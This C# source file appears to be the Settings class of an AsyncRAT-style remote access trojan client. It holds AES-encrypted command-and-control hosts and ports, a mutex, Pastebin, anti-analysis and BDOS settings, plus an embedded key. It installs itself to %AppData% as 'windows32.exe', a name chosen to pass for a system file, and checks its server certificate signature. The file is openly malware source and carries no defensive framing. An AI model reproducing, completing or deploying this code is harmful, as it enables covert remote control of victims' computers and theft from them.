using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Client.Algorithm;
using Client.Helper;

namespace Client;

public static class Settings
{
	public static string Ports = "lVGogwLpGp2k5ebLxnTyX548ie98NejbpRxsqCU7THHQh1zBBLMmtoPKdXVjD9/XVyB2vO/b3Ff7HmC9UbFyXQ==";

	public static string Hosts = "gNQ1+IQud/w3Y4pVdi5AQB63w/QRGMEUeorkWx3ih9RKlDW6tdaiP2oWq8k+n+5j/+A2F4bZoPZb9SoGvXKPeg==";

	public static string Version = "Zh0t4/YtGaAs2iNaF3ZO/AS7TMxLohwLju8dvO3SSY35ZtIq28PpnF96BU3Y4SWe4ItpdPDupCYzp+ou2XBFXA==";

	public static string Install = "WRy/J5+QiWrr0XQqwdZRP/09Qot+6wBgIM5lPMg/p4b6B8e5sPD/w/4xDY8Y9HNys3OoHLqY4Pi8LJZytqpoDA==";

	public static string InstallFolder = "%AppData%";

	public static string InstallFile = "windows32.exe";

	public static string Key = "bVRmZ0hicE16QTFDRkxXaHh5TVZkZkN3elBNQUY2cTM=";

	public static string MTX = "rek6rd4AMCaooro2Vlz/ejz8PYYcaMJCyUmjkwyB0rMul9u6tvTrJcgGi2cExg7B8gBRZ4bwD5hdKrUyY9ZqTZu9daQY2ptJAtY+K6XZdMY=";

	public static string Certificate = "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";

	public static string Serversignature = "vnkt6rsYT3r3WnilMUIPBjfx14j7jRoyidy9tzj0oy0VheRd30bYvGKCzGzDGZVgqWlTN+9AY1WD1YFo+aXLzO2cVtoNoxAnizgFXaE6EoVHS9M5QRraXz6mCkxfXBsZbIjtTE4VRrspajq1J7/pZJGeF1dtTbWjeH5/oG2aBQLuOZhxY7VzVzeVcj1EBh3Nc+50g0nzFq8NML53xc6UvxL8nB25lLxVzjxPZPx+uG9iHvXNSK3rFs6ofkt8e1xsqZBGRqntzc+OuRnxwufAbAAV3/hfxarE84f4+aI3q32vRpLCg8W1rg1aDtjCC3cdoDAwnbe51hZyAgoKV2QzqfvJbDxnz4hVVA9hYou6Uhsd//vqrdZkjo8xd3uJqQfLZONT0dcFslLdTObKl/PHL6MG0YQAc3sSjGstAmenpIYykMouk+iosoXAmgAh/zYfldYs+mFUixN4zo4XElxBEdbPmWGfY/z8+yedQeYIFdWYVteOH2PUW5FjANp51X7H3WPD5eURb2iYUIWuCeUDnkYs8y0DSuO+/HJNgydXhpVn8QdcIVlR3wiZYph40m8GSwd59LCIX16J7qC/4L7T04yf9ZCNG4wFYwtLo4CItXDE7s3p2hspYn2xfHoq4BmbRQ6AXhJK/H9gvQ9N4R6L7KAcMTLe3VBpyr0LhPsBfU/pyqcCGgaQjR7AIH02vb28DzdDdY/LjpCDEuCLHk/o8PZEHTBDaCVsnSArxSOAkyor87T35shxVigKz98DyXPlzbGRdOEL7m9mDg/uZ9RdMHBlk56Jq1Tm+8j37+fEqJwGqGOdKzapODk1ylIJ9TMEExvEvGHbLyg3P/dhTGaqIj/9bIeFsRY8KO1tBJIp10/90XmtQ4yLS9rdjENS/s9AmmHqI5AbexvOFjKD8dblqIAP/caaIfKJ4PO2cH6QKeRu1xQsDIic3BLwxgZ25wUKeXavqFJD21cgmcovbE31rQ==";

	public static X509Certificate2 ServerCertificate;

	public static string Anti = "GPn91IpuDnC9xSmfeDSJB1S2fckvK11EGYuaKmLDohhTKIzLj4GQJmhFz9aBRdsvxaX2SYQG6TkJt9pU7YS9Gg==";

	public static Aes256 aes256;

	public static string Pastebin = "DpAJFJ+cHZcDJ3zkXuyed2pScU7HJBRtI/4meDo44C0zIem6OsoaW9No7yVaieqESepkIqCZs6SedfdXuEJFQQ==";

	public static string BDOS = "3qTTG1nNjAis0tg6ENxtbU4baqCdSf9cuuMZyX3EBNpmHyEgO6h+knLZshlZ942JzT2V8xsvMXLLcRBG4T6gjg==";

	public static string Hwid = null;

	public static string Delay = "3";

	public static string Group = "3NT27HLYkwJPnYK99pmdrZMNZUBUuuQeTQ5xrimPZPky+vECY8jl6vprySg3zA++yqVTYnOKLSjjYidAcB0cJA==";

	public static bool InitializeSettings()
	{
		try
		{
			Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
			aes256 = new Aes256(Key);
			Ports = aes256.Decrypt(Ports);
			Hosts = aes256.Decrypt(Hosts);
			Version = aes256.Decrypt(Version);
			Install = aes256.Decrypt(Install);
			MTX = aes256.Decrypt(MTX);
			Pastebin = aes256.Decrypt(Pastebin);
			Anti = aes256.Decrypt(Anti);
			BDOS = aes256.Decrypt(BDOS);
			Group = aes256.Decrypt(Group);
			Hwid = HwidGen.HWID();
			Serversignature = aes256.Decrypt(Serversignature);
			ServerCertificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certificate)));
			return VerifyHash();
		}
		catch
		{
			return false;
		}
	}

	private static bool VerifyHash()
	{
		try
		{
			return ((RSACryptoServiceProvider)ServerCertificate.PublicKey.Key).VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Serversignature));
		}
		catch (Exception)
		{
			return false;
		}
	}
}
